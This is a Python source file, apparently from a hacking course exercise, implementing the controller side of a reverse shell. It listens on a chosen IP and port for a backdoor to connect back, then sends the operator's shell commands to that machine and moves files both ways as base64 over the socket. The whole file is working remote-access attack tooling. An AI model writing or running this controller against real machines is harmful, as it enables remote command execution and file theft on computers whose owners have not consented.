import socket
import simplejson
import base64
import optparse


def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-i", "--ip", dest="ipaddr", help="Your ip address")
    parse_object.add_option("-p", "--port", dest="listenport", help="Desired port to listen")

    return parse_object.parse_args()
class SocketListener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("Listening...")
        (self.connection, connection_adr) = listener.accept()
        print("Connection Accepted From " + connection_adr[0])



    def send_json(self, command_input):
        json_data = simplejson.dumps(command_input)
        self.connection.send(json_data.encode("utf-8"))

    def recieve_json(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def run_command(self, command_input):
        self.send_json(command_input)

        if command_input[0] == "quit":
            self.connection.close()
            exit()

        return self.recieve_json()

    def save_file(self, path, content):
        with open(path, "wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "Download Completed"

    def read_file_content(self, path):
        with open(path, "rb") as my_file:
            return base64.b64encode(my_file.read())

    #komut sonrasi bosluklarla ayrilmis argumanlari toparlayan kisim
    def get_directory_from_list(self, command_input):
        path = ""
        for i in command_input:
            if not i == command_input[0]:
                path = path + i + " "
        return path


    def start_listener(self):
        while True:
            command_input = input("Enter Command: ")
            command_input = command_input.split(" ")
            try:
                #command_input degistirilecegi icin run_command fonksiyonu cagrilmadan tanimladim
                if command_input[0] == "upload":
                    file = self.get_directory_from_list(command_input)
                    file_content = self.read_file_content(file)
                    command_input = ["upload", file, file_content]

                command_output = self.run_command(command_input)

                if command_input[0] == "download":
                    path = self.get_directory_from_list(command_input)
                    command_output = self.save_file(path, command_output)
                    print(command_output)

                else:
                    print(command_output)

            except Exception:
                print("An Error Accurred")

(user_inputs, arguments) = get_user_input()
print(user_inputs.ipaddr)
print(user_inputs.listenport)
try:
    socket_listener = SocketListener(user_inputs.ipaddr, int(user_inputs.listenport))
    socket_listener.start_listener()
except Exception:
    print("An Error Accurred - Check IP Address And Port You Typed")
    exit()





